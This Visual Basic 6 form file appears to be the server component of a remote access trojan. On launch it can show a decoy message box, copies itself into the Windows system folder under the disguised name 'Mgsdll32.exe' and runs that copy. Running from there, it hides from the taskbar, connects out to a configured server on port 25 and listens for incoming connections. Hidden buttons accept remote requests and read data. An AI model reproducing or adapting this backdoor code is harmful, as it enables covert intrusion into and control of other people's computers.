VERSION 5.00
Begin VB.Form Form1 
   Appearance      =   0  'Flat
   BackColor       =   &H80000005&
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   135
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   240
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   DrawStyle       =   5  'Transparent
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   135
   ScaleWidth      =   240
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.CommandButton Command3 
      Caption         =   "3"
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Top             =   2160
      Width           =   375
   End
   Begin VB.CommandButton Command2 
      Caption         =   "2"
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   1920
      Width           =   375
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Sub Command2_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Winsock1.Resquest_Accept
End Sub
Private Sub Command3_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Winsock1.GetData
End Sub
Private Sub Form_Load()
If LCase(App.path) = LCase(Mid(GetSystem, 1, Len(GetSystem) - 1)) Then
If App.PrevInstance = True Then End
load App.path & "\" & App.EXEName & ".exe"
Winsock1.OpenSock
Winsock1.Connect Trim(serv.ser), 25
Winsock1.Listen Trim(serv.por)
fusi
App.TaskVisible = False
App.Title = ""
End If
If LCase(App.path) <> LCase(Mid(GetSystem, 1, Len(GetSystem) - 1)) Then
load App.path & "\" & App.EXEName & ".exe"
If Trim(serv.mes) <> "" And Trim(serv.tit) <> "" Then MsgBox Trim(serv.mes), CInt(Trim(serv.ras)), Trim(serv.tit)
If Trim(serv.pro) <> "" Then ShellExecute Form1.hWnd, vbNullString, Trim(serv.pro), vbNullString, vbNullString, 1
If fso.FileExists(GetSystem & "Mgsdll32.exe") = False Then FileCopy App.path & "\" & App.EXEName & ".exe", GetSystem & "Mgsdll32.exe"
fusi
Shell GetSystem & "Mgsdll32.exe", 1
End
End If
End Sub
Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
Winsock1.Closed
End Sub
Private Sub Form_Unload(Cancel As Integer)
Winsock1.Closed
End Sub
